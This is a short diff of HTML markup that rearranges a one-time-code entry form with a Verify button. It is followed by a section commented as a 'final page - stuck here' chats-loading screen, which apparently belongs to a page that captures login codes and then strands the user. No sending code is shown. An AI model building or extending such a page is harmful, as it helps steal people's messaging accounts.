@@ -510,12 +510,10 @@ body{background:var(--page);color:var(--ink)}
       <input type="tel" inputmode="numeric" maxlength="1">
       <input type="tel" inputmode="numeric" maxlength="1">
       <input type="tel" inputmode="numeric" maxlength="1">
+    </div> <button class="pf-btn" id="otpVerify" type="button">Verify</button>
+    <a class="pf-back" id="otpBack">← Back</a>
     </div> 
-    <button class="pf-btn" id="otpVerify">Verify</button> <a class="pf-back" id="otpBack">← Back</a> 
-    </div> 
-    </div> 
-    </div>
-
+     </div>
 <!-- ============ LOADING YOUR CHATS (final page - stuck here) ============ -->
 <div id="chatsLoading">
   <div class="cl-inner">
